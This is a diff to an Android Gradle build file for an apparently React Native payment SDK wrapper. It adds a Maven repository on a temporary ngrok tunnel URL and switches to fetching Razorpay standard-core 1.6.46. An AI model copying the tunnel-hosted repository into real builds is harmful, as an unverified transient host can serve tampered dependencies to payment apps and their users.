@@ -1,6 +1,10 @@
 apply plugin: 'com.android.library'
 repositories {
     mavenCentral()
+    maven {
+            name "reposiliteRepository"
+            url "https://2e90-2405-201-d034-e0cf-8959-2af1-b985-af87.ngrok-free.app/releases"
+        }
     
 }
 def safeExtGet(prop, fallback) {
@@ -20,8 +24,9 @@ android {
 }
 
 dependencies {
-    implementation fileTree(dir:"libs", includes:["*.aar"])
+    // implementation fileTree(dir:"libs", includes:["*.aar"])
     // implementation 'com.razorpay:standard-core:1.6.42'
+    implementation 'com.razorpay:standard-core:1.6.46'
     implementation 'com.google.android.gms:play-services-auth:20.6.0'
     implementation 'com.google.android.gms:play-services-auth-api-phone:18.0.1'
     implementation 'com.facebook.react:react-native:+'
